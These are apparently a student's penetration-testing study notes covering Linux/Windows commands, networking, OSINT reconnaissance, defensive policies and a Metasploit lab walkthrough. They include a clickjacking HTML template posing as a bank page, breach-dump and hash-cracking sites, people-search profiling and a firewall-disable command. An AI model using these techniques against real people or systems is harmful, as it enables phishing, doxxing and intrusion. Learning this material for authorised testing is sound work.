  Section 1

Ethical Hacking: Hacking with the legal permissions
Penetration Testing: As same as Ethical Hacking but we use PENTEST because Hacking word has a bad image in the society.

1.	Information Gathering/ Recon
a.	Passive  Indirect IG
i.	Getting info of the target from other sources.

2.	Scanning and Enumeration 
a.	Directly engage with the application 
b.	IP and PORT
i.	IP  HOME
ii.	PORT  ROOM
1.	PROT 21 > ftp
2.	PROT 22 > ssh
3.	PROT 80 > http
4.	PROT 443 > https

3.	Exploitation
a.	Finding exploit for a particular vulnerability or it’s like a gaining access to the target.

4.	Maintaining Access
a.	Creating a backdoor in the targeted system to getting access for next time.

5.	Covering Tracks
a.	Clearing or deleting the logs and histories from the targeted system to not get caught.

6.	Data Breaches
a.	It occurs when a hacker sells a victim’s information.
b.	';--have i been pwned? Is a website where can check is this email is data breached or not.

7.	Operating Systems
a.	Kali Linux, Windows.

8.	Virtualization
a.	VirtualBox, VM Ware.

9.	Bug Bounty 
a.	Finding and reporting of bugs and vulnerabilities.
b.	bugcrowd
c.	hackerone
d.	intext: report a bug intext:reward
e.	Bug Bounty Helper

 
Section 2
Linux Basics & Important Commands
•	cd - chdir (Change Directory).
	cd / : to come to root
	cd : come to default path
	cd /usr/bin : particular path
	.. : come one directory back
	../../ : come 2 times back 

•	pwd - print working directory.
	used to print working directory.

•	touch - change file timestamps
	create a file
	touch textfile.txt
	touch file1 file2 file3 : create more than one file.
	touch docfile{1..10} : will create 10 file named docfile
	touch -d tomorrow willcreatefileonnextday.txt 

•	mousepad — simple text editor for Xfce
	used to open text editor 
	mousepad textfile.txt

•	nano Nano's ANOther editor. 
	nano filename.txt
	CTRL + X > Y > FILENAME > ENTER : to save 

•	vim - Vi IMproved, a programmer's text editor
	hit i to start typing
	hit ESC > SHIFT + : > wq : to save file

•	ls - list directory contents
	ls : lists the directory contents of files and directories
	ls -l or ll : use a long listing format
	ls -a or la : show hidden entries starting with .
	ls -al : show hidden entries in long listing format.

•	echo - display a line of text
	echo Hello me! : used to print the content.
	echo “save this txt in a file” > new.txt
	echo “this txt will be saved on next line” >> new.txt

•	cat - concatenate files and print on the standard output
	cat filename.txt : display the content of a file.

•	shred - overwrite a file to hide its contents, and optionally delete it
	shred filename.txt : no one can read this file

•	mkdir - make directories
	mkdir newfolder : used to create directories.

•	cp - copy files and directories 
	cp textfile.txt /newfolder : used to copy file to directories

•	mv - move (rename) files
	mv textfile.txt /newfolder/textfile.txt : used to move files and directories
	mv filename.txt file.txt : used to renames files and directories

•	rm - remove files or directories
	rm file.txt : used to delete files.
	rmdir newfolder/ : used to delete directory.
	rm -r or rm -rf newfolder/ : delete not empty directory.

•	ln - make links between files
	ln -s text.txt newlinkfilelikeshortcut : used to link a file to new file.

•	whoami - print effective user name
	whoami : print the user ID

•	users
	display the login names

•	sudo , sudoedit — execute a command as another user.
	sudo su : to become a root user
	su : also can become root
	sudo <anycmd> : execute cmd with root privileges. 
	su username : to become that user.
	exit : to go back

•	adduser, useradd - add or manipulate users
	useradd username : will add user quickly without asking anything.
	addusser username2 : will ask information to give new user.

•	passwd - change user password
	sudo passwd username : to change password of username

•	apt - command-line interface (Debian based)
	apt update : download package information from all configured sources.
	apt-get install update : same
	apt upgrade : install available upgrades of all packages currently installed on the system
	apt-get install upgrade : same
	apt install <pakagename> : Install software 
	apt-get install <pakagename> same

•	man - an interface to the system reference manuals
	man <any cmd/tool> : show manual

•	whatis - display one-line manual page descriptions
	whatis <any cmd/tool> : show one line description

•	which - locate a command
	which <cmd/tool> : pathname of the files (or links)

•	whereis - locate the binary, source, and manual page files for a command
	whereis <cmd/tool> : show all pathnames of the files (or links)

•	diff, cmp - compare two files
	cmp file1.txt file1mod.txt : compare two files byte by byte
	diff file1.txt file2mod.txt : compare two files line by line

•	find, locate  - search for files
	find / -name “filename*” : search for files in a directory hierarchy
	find . -type f -name “.*” : also find hidden files
	find . -type f -empty : also find empty directory 
	file . -perm /a=x : find executable files.
	locate filename : find files by name, quickly.

•	Simple Math
	echo "3+4" | bc : simple math, u will get result
	echo "3-4" | bc : bc will give u the answer
	echo "3*4" | bc
	echo "3/4" | bc


•	Package and Compress (archive) files
	zip document : compress files in .zip format
	unzip document.zip : extract .zip files.

	gzip document : compress files in .gz format
	gunzip document.gz : extract .gz files

	tar -czvf newzipname.tar /anydir files
	tar -xzvf document.tar : extract .tar files
	-c: Create an archive.
	-x: Extract an archive.
	-z: Compress the archive with gzip.
	-v: Display progress in the terminal while creating the archive, also known as “verbose” mode. The v is always optional in these commands, but it’s helpful.
	-f: Allows you to specify the filename of the archive.
	tar -czvf archive.tar.gz /home/ubuntu/Downloads /usr/local/stuff /home/ubuntu/Documents


•	Network Tools - configure a network interface
	sudo apt install net-tools : If not install
	ifconfig : show network info
	ip address : show ip address
	ip address | grep eth0 | grep inet | awk '{print $2}' : just show ip
	cat /etc/resolv.conf : show the DNS
	resolvectl status : show DNS status.

	ping website.com : to check is it up or not
	ping -c 4 website.com : send only 4 packets to check
	ping -c 4 -s 500 website.com : send 500bytes 4 packets

	netstat - Print network stuff
	netstat : show network stat
	netstat -tulpn : show open ports in our sys
	ss : short and better cmd for netstat
	ss -tulpn : short cmd for netstat -tulpn

	ufw - program for managing a netfilter firewall
	ufw allow 80 : it allows port 80
	ufw app list : show available apps
	ufw status : show firewall active apps status
	ufw enable : enable or disable ufw 


•	System Information
	uname : displays the current system's information.
	uname -a : print all information
	apt install neofetch : must install
	neofetch : show sys all info in pretty 
	free : Display amount of free and used memory in the system
	df or df -H : report file system space usage


•	System Processes
	ps : show the current processes.
	ps -aux : show more processes.
	top : display all processes eating ur stuff
	htop : same but pretty good to see.
	kill -9 <psid> : will kill the particular processes.
	pkill -f <psname> : will kill the process u mentioned.


•	System Control the systemd system and service manager
	systemctl start apache2 : start the particular service
	systemctl stop apache2 : stop the particular service
	systemctl restart apache2 : restart the particular service
	systemctl status apache2 : show status of the particular service
	history : show all executed commands
	sudo reboot: will reboot the system
	sudo shutdown : it will shutdown the system in a minute
	sudo shutdown -h : it will shutdown the system right now.
 
Section 2
Windows Basics & Important Commands
•	Networking
o	ipconfig: display IP information
o	ipconfig /all: show all addresses including MAC and DNS
o	ipconfig /all | findstr DNS: filter DNS with findstr
o	ipconfig /release: release current IP address
o	ipconfig /renew: renew IP address
o	ipconfig /displaydns: display DNS with IP addresses
o	ipconfig /displaydns | clip: copy the output on clipboard
o	ipconfig /flushdns: remove old DNS entries
o	nslookup target.com: display IP and DNS
o	nslookup target.com 8.8.8.8: check DNS from Google
o	nslookup -type=ptr target.com: display more details
o	netsh interface show interface: show network interface
o	netsh wlan show wlanreport: give wireless report
o	netsh interface ip show address | findstr "IP Add": show all IP addresses
o	ping target.com: check host is up or not
o	ping -t target.com: ping continuously
o	tracert target.com: trace route to target.com
o	tracert -d target.com: speed up tracert
o	netstat: show ports
o	netstat -af: show more
o	netstat -o: show with address
o	netstat -e -t 5:

•	File and System Management
o	assoc: view file association
o	assoc .mp4=VLC.vlc: assign file type
o	chkdsk /f: fix errors on the disk
o	chkdsk /r: locate bad sectors and recover readable information
o	sfc /scnnow: scan integrity of all protected system files and repair files with problems when possible

•	DISM: Deployment Image Servicing and Management
o	DISM /Online /Cleanup-Image /ScanHealth
o	DISM /Online /Cleanup-Image /RestorHealth
o	tasklist: show all running processes
o	tasklist | findstr <prc_name>
o	taskkill /f /pid 11232: kill a process
o	shutdown /r /fw /f /t /0: restart computer into BIOS
o	Display
o	cls: clear screen
o	getmac /v: view all MAC addresses

•	Power Management
o	powercfg /energy: show issues with power.
o	powercfg /battryreport: show battery report.

•	Firewall
o	netsh advfirewall set allprofiles state off: turn off firewall.
o	netsh advfirewall set allprofiles state on: turn on firewall

•	Routing
o	route print: show route table.
o	route add 192.168.40.0 mask 255.255.255.0 10.7.1.44: custom route.
o	route delete 192.168.40.0: delete custom route.
 
Section 3
LINUX Permissions
root@kali:~$	ls –l or ll
total 20
drwxr-xr-x 2 kali root 4096 Aug  7 15:06 Desktop
drwxr-xr-x 2 kali root 4096 May 12 12:19 Documents
drwxr-xr-x 2 kali root 4096 Aug 12 06:54 Downloads
-rw-r—-r-- 1 kali root  621 Jan 25 20:25 file.php

d rwx r-x r-x  2  kali  root  4096  Aug 7 15:06  Desktop
d	rwx	r-x	r-x	2	kali	root	4096	Aug 7 15:06	Desktop
file type	user permissions	group permissions	other (everyone) permissions	number of hard links	user (owner) name	group name	size	date/time last modified	Filename/
Directory name


r = read = 4
w = write = 2
x = execute = 1
ex. 	chmod +x file.txt
	chmod 726 file.txt

002	-rw-rw-r--	drwxrwxr-x
007	-rw-rw----	drwxrwx---
022	-rw-r--r--	drwxr-xr-x
027	-rw-r-----	drwxr-x---
077	-rw-------	drwx------
 
Section 4
Networking
Types:
o	LAN (Local Area Network)
	Office or Home or Institute 
o	MAN (Metropolitan Area Network)
	Office1 – Office 2 – Warehouse – are connected
o	WAN (Wide Area Network)
	Connected across countries
o	PAN (Personal Area Network)
	Laptop – phone – headphones – printer

Internet Protocol (IP)
	Public IP
	Private IP
IPv4:
	192 . 168 . 29 . 210  =  32 bits (Each octet contains 8 bits)
	2^32 = 4,29,49,67,296 possible ips but it excides the population that’s why created ipv6
IPv6:
	e80 :: a00 : 27ff : fedb : 966a = 128 bits
2^128 = A BIG NUMBER OVER THAN WORLD POPULATION
 
Section 5
Information Gathering/ Reconnaissance

•	Learn about company from Wikipedia
o	Learn what they do?
o	How do they work?
o	dorks.faisalahmed.me
•	whois - client for the whois directory service
o	whois target.com
•	nslookup - query Internet name servers interactively
o	set type=ns or A or mx or any attributes
•	DMitry - Deepmagic Information Gathering Tool
o	dmitry target.com
•	traceroute - print the route packets trace to network host
•	Wayback Machine is an initiative of the Internet Archive. Only available for sites that allow crawlers.
o	This is a website that allows Internet users to see what certain websites look like at some point in the past. These sites are archived and are currently inaccessible outside the Wayback Machine.
o	The Wayback Machine can be a really useful asset when composing a Social Engineering Attack, valuable information might be pulled from the past. It is not seldom to find the telephone number or email of a CEO or someone important back from the time when they haven't been that relevant.
•	OSINT Framework: (Open-Source Intelligence) it’s an Information Gathering Tool. By gathering publicly available sources of information about a particular target an attacker – or friendly penetration tester – can profile a potential victim to better understand its characteristics and to narrow down the search area for possible vulnerabilities.
•	';--have i been pwned? HIBP enables you to discover if your account was exposed in most of the data breaches by directly searching the system.
•	Netcraft Site Report Find out the infrastructure and technologies used by any site using results from our internet data mining. It’s like whatweb and wappalyzer.
•	GRABIFY & IP Logger is a URL & Shortener provides you with some of the most advanced and detailed statistical data and metadata for all clicks on your links. Your IP Logger link can access information about user's IP address, location tracker (country, city) and so on.
•	MALTEGO Handbook: Social-Media-Investigations offers real-time data mining and information gathering and Social Engineering.
•	Smikta is used for phishing, it has readymade phishing links.
•	Looking for the acquisition.
o	Go to Crunchbase.com  and Acquiredby.co to find targeted companies acquisitions
o	Crt.sh/ is a site where you could find all the SSL or TLS certificates of the particular targeted domain.
•	IP ranges and ASNumbers
o	bgp.he.net to get ASNumbers.
o	ASN Contains IP ranges (8.45.124.0/24)
o	mxtoolbox.com to get CIDR Range
o	How to find original targets.com’s IP
	Viewdns.Info shows history of dns
•	Using subfinder v2.5.3
o	subfinder -d <target.com> used to find out all subdomains related target site.
o	subfinder -d <target.com> -silent, used to get only subdomains without braging
o	subfinder -d <target.com> -o <subs.txt>, used to save result in text file.
o	wc -l <subs.txt> , to count lines in txt file.
•	Using assetfinder:
o	-subs-only (Only include subdomains of search domain) 
o	go install github.com/tomnomnom/assetfinder@latest
o	assetfinder -subs-only <target.com>
o	assetfinder -subs-only <target.com> > <assets.txt> to save result in text file
o	assetfinder -subs-only <target.com> | tee <assets.txt> to save + display output
o	cat *.txt | sort -u | wc -l
	to display every .txt files in the dir
	filter out duplicate lines
	count total lines from .txt files from dir
•	Other Tools
o	SubEnum : using 4 tools and 3 online services
o	Subdomains Tools Review YesWeHack.com
o	subdomain-enumeration · GitHub Topics
•	arp-scan -l , To see devices connected to router, will get ip addresses for connected devices
o	you can copy ipv4 address and paste in browser
•	Wappalyzer is add-on is a technology profiler that shows you what websites are built with. Find out what CMS a website is using, as well as any framework, ecommerce platform, JavaScript libraries and many more. Shows you what technology used by your target.
•	whatweb <target ip/site> is similar to wappalyzer but gives more details.
•	Dorking: gain access to sensitive information
o	https://www.exploit-db.com/google-hacking-database
o	https://dorks.faisalahmed.me/
o	https://vsec7.github.io/
o	https://github.com/techgaun/github-dorks
•	All Net Tools Net Sniffer, Net Monitor
•	Spokeo - People Search | White Pages | Reverse Phone Lookup
•	The Social-Engineer Toolkit (SET) is an open-source penetration testing framework designed for social engineering.

o	setoolkit
	1) Social-Engineering Attacks
•	1) Spear-Phishing Attack Vectors
•	2) Website Attack Vectors
•	3) Infectious Media Generator
•	4) Create a Payload and Listener
•	5) Mass Mailer Attack
•	6) Arduino-Based Attack Vector
•	7) Wireless Access Point Attack Vector
•	8) QRCode Generator Attack Vector
•	9) Powershell Attack Vectors
•	10) Third Party Modules

	2) Penetration Testing (Fast-Track)
•	1) Microsoft SQL Bruter
•	2) Custom Exploits
•	3) SCCM Attack Vector
•	4) Dell DRAC/Chassis Default Checker
•	5) RID_ENUM - User Enumeration Attack
•	6) PSEXEC Powershell Injection

	3) Third Party Modules
•	1. Google Analytics Attack by @ZonkSec
•	2. RATTE Java Applet Attack (Remote Administration Tool Tommy Edition) - Read the readme/RATTE_README.txt first
•	3. RATTE (Remote Administration Tool Tommy Edition) Create Payload only. Read the readme/RATTE-Readme.txt first
•	Clickjacking is an attack that fools’ users into thinking they are clicking on one thing when they are actually clicking on another. Its other name, user interface (UI) redressing, better describes what is going on.
o	CLICKJACKING save code as .html
<html>
<head>
<tit1e>Banking Website</title>
<body>
<p>Dear Customer, regret for slow connection, Kindly login again</p>
<iframe src="https://rku.ac.in/" width="1000" height="1200"></iframe>
</body>
</html>

Passive Reconnaissance

VPN’s Leaks:
Client  ISP  Tracker
Free VPN’s are RED Flag.
VPN USES:
o	Obscure your IP address (even from your own ISP)
o	Make tracking you harder
o	Potentially protect your data from law enforcement
o	Encrypts your traffic (or should!)
o	Circumvents censorship
o	Can route your traffic from other cities, states, or even countries.
DNS Leaks:
DNS leak is a security flaw that occurs when requests are sent to an ISP's DNS servers even when a VPN is being used to protect users
o	https://www.dnsleaktest.com/ Test here if it show ur real IP, i.e ur DNS leaking.
NOTE: Research your VPN before using and always do a DNS leak test.

Sock Puppet:
•	Also sometimes referred to as a burner account.
•	This is an alternative account (email, username, fake identity, etc.) that is in no way
•	associated with us.
•	Typically uses an alternative name, location, username, email address, physical
•	address, phone number, fake profile picture, job title/employer, etc.
•	Should not use any password that we used before.
•	Varies in complexity

People Search Engines: search people by name/ phone number/ email id/ city 
•	https://www.spydialer.com/
•	https://xlek.com/
•	https://socialcatfish.com/
•	https://pipl.com/
•	https://webmii.com/
•	https://www.familysearch.org/search/tree/name
•	https://www.findagrave.com/

Data Breaches: Find password dumps and data breaches
•	https://www.google.com/search?q=RaidForums
•	https://www.dehashed.com/
•	https://haveibeenpwned.com/
•	https://pastebin.com/

Password Hashes: Bruteforce md5 hashed passwords.
•	https://md5decrypt.net/
•	https://www.dcode.fr/md5-hash

Searching Social Media: 
•	Social Media accounts can provide a wealth of reconnaissance information.
•	Photos posted should be inspected for potential recon information.
•	Posts, friends, followers, and following can all lead to additional information.
•	Usernames tend to be unique and can be checked if used elsewhere.
•	User profiles may also give us additional information.

•	Searching Social Media 
a.	User name
i.	Unique name?
ii.	Used elsewhere?
iii.	Register date/time

b.	User info
i.	Location
ii.	Job - Does that work place have a website?
iii.	Name - name search
iv.	Other personal identifiers

c.	Posts
i.	Dates & time - Other unique events tied to this time/date?
ii.	Content - Names, dates, other unique information
iii.	Reposted or original? - Who liked or commented on this - Do those users tie back to our target?
iv.	Media
1.	Pictures
a.	View for content
b.	Metadata
c.	Geo location
d.	Reverse image
i.	Indefinable?
ii.	Used elsewhere?

2.	Video
a.	View for content
b.	Metadata
c.	Take still shot and reverse image
i.	Indefinable?
ii.	Used elsewhere?

d.	Followers/ Following
i.	Who are they following and why?
ii.	Who is following and why?
iii.	View the pages Of the followers/following - Is there unique information about our target?

Internet Archive
https://archive.org/
	Useful when someone post something, and they realize this info is sensitive, so they delete that post.
so to get this post back, we just need a link of this post and date and time of that post before deleting it.

Maigret: Finding Accounts with Maigret | Maigret GitHub
	Maigret collects a dossier on a person by username only, checking for accounts on a huge number of sites and gathering all the available information from web pages. Currently supported more than 2500 sites (full list), search is launched against 500 popular sites in descending order of popularity by default. Also supported checking of Tor sites, I2P sites, and domains (via DNS resolving).
cmd: maigret <username>

Reverse Image Searches:
	Find information by image search
•	https://images.google.com/
•	https://www.bing.com/images/
•	https://yandex.com/images/ (best for face searching)
•	https://tineye.com/

Streets and Maps: Researching with Satellites:
•	https://www.google.com/maps or https://earth.google.com/ 
	Helpful, when reconnaissance on any company building or house of a person, like what this place looks like, how many fire hydrant are there, height of this building, or how many security cameras are there, weak points to break into, and so on.

Website/Server Scanning:
Glassdoor: A Deeper Look Into a Company
•	https://www.glassdoor.com/
Useful when reconnaissance on any company or business, Look for employee feedback or revives of a particular company, this We can see the number employees. We can see a number of reviews, jobs, salaries, interviews, benefits, photos, information like the website, size of the company business type, overall revenue, where the headquarters is when it was found at the type of industry. People from the companies is a great way to recon a business.

Nmap/Zenmap Scanning:
	Use to do things like a basic scan, firewall detections, port scanning, Stealth scanning, OS information and so on.
•	nmap <ip> (Basic scan)
•	nmap -A <ip> (All scan)
•	nmap -sS <ip> (Stealth scan)

Metagoofil: Sensitive Document Searching | Metagoofil GitHub
	It is actually crawls websites for files. Information gathering tool designed for extracting metadata of public documents (pdf, doc, xls, ppt, docx, pptx, xlsx) belonging to a target company.
metagoofil -d apple.com -t doc,pdf -1 200 -n 50 
metagoofil -d <target domain> -t <file. type> -l <result length> -n <max no. to downld per file type>

Shodan: The Hacker’s Search Engine
•	https://www.shodan.io/
•	https://github.com/humblelad/Shodan-Dorks
Shodan is a search engine that lets the user find specific types of computers (webcams, routers, servers, etc.) connected to the internet using a variety of filters.

BuiltWith Technology Lookup
•	https://builtwith.com/
	Build lists of websites from our database of 62,269+ web technologies and over 673 million websites.

Spiderfoot: Spidering with Spiderfoot
•	https://www.spiderfoot.net/
•	https://github.com/smicallef/spiderfoot
	SpiderFoot is an open source intelligence (OSINT) automation tool. It integrates with just about every data source available and utilises a range of methods for data analysis, making that data easy to navigate.

DIG: Digging Into a Domain With DIG
Network admin tool for querying DNS servers (Pre Installed in kali)
CMD:	dig <domain.name>
	dig MX <domain.name>
	dig TTL <domain.name>

Employee Best Practices:
Posting on Social Media: 
It’s never delete or edit post posted on social media, thing 2x before posting.

Passwords and 2FA:
Passwd: Q3nT!jpO (Very Strong) Time to crack your password: 443 years
Passwd: H@ckT3PI@n37 (Strong) Time to crack your password: 10 months
Passwd: Thequickbrownfoxjumpedoverthelazydog (Very Strong) Time to crack your password: 30 million years

Password Managers: Works well-defeating keyloggers
•	KeePassXC - Cross-Platform Password Manager https://keepassxc.org/
•	LastPass***| https://www.lastpass.com/

Two Factor Authentication (2FA):
Types:
•	Hardware
•	Software
•	SMS & phone
•	Email option
•	Adds an additional layer of security
•	SMS & phone not recommended
•	Even if someone has your password
Software:
•	Google Authenticator https://googleauthenticator.net/
•	Authy | 2FA https://authy.com/
•	Microsoft Authenticator https://www.microsoft.com/en-us/security/mobile-authenticator-app
Practice:
•	Have a strong password or passphrase.
•	Don't reuse passwords.
•	Consider using a password manager.
•	Enable 2FA on all available accounts.
•	Avoid SMS and phone-based 2FA when possible.

Phishing: Why Does Phishing Works?
Typical Reasons: 	
•	Amygdala: The part of the brain that handles fight or flight.
•	Scarcity: Buy now! Limited time only! Limited numbers are available!
•	Fear: Comply with our demands or else!
•	Greed: I have got a deal for you!
•	Authority: This is the IT department, this is your boss, I need you to do...
Additional Prevention:
•	Did you expect that email?
•	Do you know that person or vendor and have an account with them?
•	Call the business directly, do not use the phone number provided in the email.
•	Pause for a few minutes before reacting.
•	If you receive an invoice that you did not expect check directly with the vendor and/or
•	with your business department when possible.
•	Research the business and email address for fraud.
•	Consider phishing tests
•	Have a reporting mechanism in place.
•	Train your employees and warn them of any current threats.

Network Defenses
Web Domain Lockdown
A Misconfigured or Compromised Website:
•	Lead to your file server(s) being compromised
•	Information leaked
•	Documents leaked
•	Compromised accounts (employees and clients)
•	Ransomware attacks
•	File servers being used for DDOS attacks
•	Phishing/spear phishing attacks
Protect Your Domain
Steps:
•	Monitor Your Renewal & Registrar: Be sure to use a reputable registrar and keep your domain renewal up to date.
•	Set Your Domain as Private: Enable the private domain option, this will cost a little extra.
•	Regular Updates: Your website likely has a number of different technologies, update them (plugins, etc.).
•	Monitor Your Contacts: Who has access to your domain? Keep a log and keep active users up to date.
•	Mindful of Information Shared: Be careful not to overshare important information on your site including documents.
•	Regular Audits: Regular pentests and audits can help safeguard your website from attacks.

Firewalls
•	Are important as they monitor and malicious network traffic.
•	There are 2 types of firewalls: hardware and software.
•	Hardware firewalls are generally used in enterprise environments (though smaller ones do exist for home). Software firewalls are typically seen for home use.

IDS/IPS:
Intrusion Detection System (IDS):
•	An IDS will inspect internal traffic for suspicious or malicious activity.
•	An IDS scans using a signature-based system or anomaly-based system.
•	IDS can be Host-based (HIDS) or Network-based (NIDS)
•	HIDS: A host signature-based system is deployed on an endpoint and designed to protect against internal and external threats.
•	NIDS: It is designed to monitor an entire network.
•	https://www.snort.org/ (Open Source)
•	https://securityonionsolutions.com/ (Open Source)
•	https://www.solarwinds.com/ (Paid)

Intrusion Prevention System (IPS):
•	Alert you of malicious activity
•	Drop malicious packets
•	Block traffic from the source address
•	Reset connections
•	NIPS (Network Intrusion Prevention System) Set at strategic positions to monitor traffic, HIPS (Host Intrusion Prevention System) Installed at the endpoint to monitor inbound/outbound, NBA (Network Behavior Analysis) Detects unusual traffic, WIPS Wireless Intrusion Prevention System) Wireless monitoring for unauthorized traffic, and removal.

Auditing:
A cybersecurity audit involves a comprehensive analysis and review of the IT infrastructure of your business. It detects vulnerabilities and threats, displaying weak links, and high-risk practices. It is a primary method for examining compliance.
Things to Audit:
•	User accounts (add, remove, or suspend)
•	Services
•	Servers
•	Roles and responsibilities
•	Password complexities, policies, and expiry dates
•	Software licenses
•	Patches
•	Operating Systems and EOL
Softwares:
•	TOOLS4EVER https://www.tools4ever.com/software/ 
•	Netwrix Auditor for Windows File Servers https://www.netwrix.com/file_server_auditing.html
Building an Audit:
•	Planning
•	Collaborating with other departments i.e., HR, Payroll, etc.
•	Need to know what to audit.
•	What are your needs and criteria?
•	What the threshold are?
•	Who is involved?
•	How to implement your policies?
•	Manual, automated, etc.

Policies:
Considerations:
•	Accessible: The policies need to be accessible to everyone involved
•	Evaluate Your Needs: What needs and goals are the policies set to achieve?
•	Who Will be Affected?: Who will the policies involve and affect?
•	Set Reasonable Expectations: Make sure that your policies are reasonable to ask of your employees. Also, make sure your security policies can actually be achieved.
•	Regular Maintenance: Regular backups, restore checks, patches, etc.
•	HR, Management, Legal, Business: It's always a good idea to have management and HR approvals for any new policies to ensure compliance
•	Distribution/Communication/Training: How will the policies be distributed and how will employees be trained on these policies?
•	Enforcement & Rapid Response: How will the policies be enforced?

Policies Examples:
Ransomware Policy Guide: Disposable Games Studio
Ransomware policy guide: Internal document, not for general distribution.
Internal Policy:
•	In the event of a ransomware attack (if your computer falls victim to a ransomware attack) please perform the following steps.
•	Do NOT delete the file, email, or other files that you opened.
•	Immediately contact the IT department at x8087 and inform them what happened.
•	Do not attempt to log into any other system, email, etc. until otherwise directed
•	Notify your immediate supervisor to inform them of the situation.
IT Helpdesk and Networking:
•	Relay information to the response team
•	Use the emergency call list to inform contacts (in order)
•	Networking team: Isolate network traffic
•	Assess workstations and servers that are affected
•	Remove any internet access to those devices (patch cable removed, wireless off)
•	Ensure no removable media was detached unless by authorized personnel.
•	Determine the strain of ransomware and verify if the decryption key exists on the premise.
•	Determine ransom demand and instructions.
•	Contact the legal department, HR, CTO, and media department.
•	Determine the quality of backup/restore files and system.
•	Determine the time to remove infection or restoration of servers and workstations.
•	Assess potential loss (Calculated loss rate)
•	Forward information to the response team (information to be ultimately given to HR and the media department for press release)
•	If restoration is not possible, the recovery team and legal department will work on ransom negotiation and the likelihood of files being restored.
•	Post-mortem and final press release
•	Reassessment of network security and training based on post-mortem.
•	Implementation of new defense and training
 
Section 6
SYSTEM PENETRATION-TESTING

# HTTP status codes:
	HTTP status 200 – Successful
o	The HTTP 200 OK success status response code indicates that the request has succeeded. A 200 response is cacheable by default. 
o	The meaning of a success depends on the HTTP request method: GET : The resource has been fetched and is transmitted in the message body.
	HTTP status 301 – Moved Permanently
o	The HTTP 301 Moved Permanently redirect status response code indicates that the requested resource has been definitively moved to the URL given by the Location headers. A browser redirects to the new URL and search engines update their links to the resource.
	HTTP status 302 – Found
o	The HTTP 302 Found redirect status response code indicates that the resource requested has been temporarily moved to the URL given by the Location header. A browser redirects to this page but search engines don't update their links to the resource (in 'SEO-speak', it is said that the 'link-juice' is not sent to the new URL).
	HTTP status 303 - See Other
o	The HTTP 303 See Other redirect status response code indicates that the redirects don't link to the requested resource itself, but to another page (such as a confirmation page, a representation of a real-world object — see HTTP range-14 — or an upload-progress page). This response code is often sent back as a result of PUT or POST. The method used to display this redirected page is always GET.
	HTTP status 304 - Not Modified
o	The HTTP 304 Not Modified client redirection response code indicates that there is no need to retransmit the requested resources. It is an implicit redirection to a cached resource. This happens when the request method is a safe method, such as GET or HEAD, or when the request is conditional and uses an If-None-Match or an If-Modified-Since header.
	HTTP status 400 - Bad Request
o	The server can't process the request due to clientside errors.
	HTTP status 401 – Unauthorized
o	The 401-status code indicates that the HTTP request has not been applied because it lacks valid authentication credentials (usually username and password) for the target resource.
o	If the request included authentication credentials, the 401 response indicates that authorization has been refused for those credentials. Please check if your username and password are correct.
	HTTP status 403 – Forbidden
o	This is a permissions issue. You often encounter this error when no index file (.htm, .html or .php) is present and the directory listing is off for a folder in the Web space (Line "Options -Indexes" in a .htaccess file).
o	Sometimes user authentication was provided, but the authenticated user is not permitted to view the content of the folder or file. Other times the operation is forbidden to all users. Sometimes this error occurs if there are too many connections at the same time. The easyname support team can explain you this issue in depth.
	HTTP status 404 - Not Found
o	This error message is shown when a site or folder on a server are requested but cannot be found at the given URL. Please check your input.
o	Please note that this error can also appear if there is no start file (index.php or index.html).
	HTTP status 406 - Not Acceptable
o	This error often occurs with the application firewall (mod_security). To protect against attacks on web applications, incoming and outgoing data traffic is checked for rule violations. If an action violates one of these rules, the corresponding IP address is temporarily blocked, and the user receives the status message "406 - Not Acceptable".
o	The IP address is automatically unblocked after some time and access to the web application is then possible again. The time period depends on the severity of the violation.
o	Another possibility to make it accessible again is to deactivate the application firewall. It can be deactivated either for the entire web hosting or only for individual subdomains.
	HTTP Error 408 - Request Timeout
o	The server took longer than its allocated timeout window. In this case the server terminates the connection.
	HTTP status 429 - Too Many Requests
o	The HTTP 429 Too Many Requests response status code indicates the user has sent too many requests in a given amount of time.
o	A Retry-After header might be included to this response indicating how long to wait before making a new request.
	HTTP status 500 - Internal Server Error
o	This is a "catch all" status for unexpected errors. The server-side error message is commonly caused by eg. misconfigured .htaccess files or PHP errors, which you you can check in the file php_error.log on your Webhost.
o	You can find the php_error.log file in the /log/ directory - this directory can be found on the same level as your /html/ directory
	HTTP status 502 - Bad Gateway
o	This HTTP status code indicates that under the specified URL there's no content to be displayed.
	HTTP status 503 - Service unavailable
o	This means, that the server is currently unavailable, or the server is overallocated. You can check the file php_error.log as described for the status code 500.
	HTTP status 504 - Gateway timeout
o	This means, that the server has not responded within the specified time period.

•	Directory brute force is used to find hidden and often forgotten directories on a site to try to compromise. Some various automated tools and scripts retrieve the status of the directory which is brute forced from custom wordlists.
•	dirsearch - Web path discovery
o	python3 dirsearch.py -u <Target IP or URL>
•	ffuf - Fuzz Faster U Fool 
o	ffuf - Fast web fuzzer written in Go
o	ffuf -w lfi-payload.txt -u https://0a4c003c0455c109c0b78cec00a200ef.web-security-academy.net/image?filename=FUZZ -mc 200


•	Nmap ("Network Mapper") is used to discover hosts and services on a computer network by sending packets and analyzing the responses. Nmap provides a number of features for probing computer networks, including host discovery and service and operating system detection.
o	nmap -p <port or port range (1-100)> <target IP>, used to scan ports.
o	nmap -p- -A <target ip>, used to scan for all ports
o	Whenever you found open port that means you can get access through it.
o	If you see (ftp-anon: Anonymous FTP login allowed (FTP code 230)) go their ftp service and enter
	Username: anonymous
	Password: anonymous
o	ftp 192.168.1.36
Connected to 192.168.1.36
.
220-
220-|------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|------------------------------------------------------------|
220-
220 
Name (192.168.1.36:kali): anonymous
331 Please specify the password.
Password: anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
•	PORTS: You Can Hack
o	ftp
o	ssh
•	msfconsole is metasploit v6.2.15-dev
o	search samba
o	use 14 or exploit/linux/samba/is_known_pipename 
o	set RHOSTS 192.168.1.36
o	set RPORT 139
o	RHOSTS  Target’s IP
o	LHOSTS  Attacker’s IP(Our IP)
o	RPORT  139
o	LPORT  any available pors in ur OS (4444/1337)
o	mysql
•	wafw00f is used to detect web application firewall.
o	wafw00f <url>

•	nikto - Scan web server for known vulnerabilities
o	nikto -h
o	nikto -host <target ip>
o	nikto -host 192.168.1.36 -port 12380
•	wpscan - WordPress Security Scanner
o	wpscan --url https://192.168.1.36:12380/blogblog/ -e vp -e vt -e u
o	wpscan --url https://192.168.1.36:12380/blogblog/ -e vp -e vt -e u --disable-tls-checks 
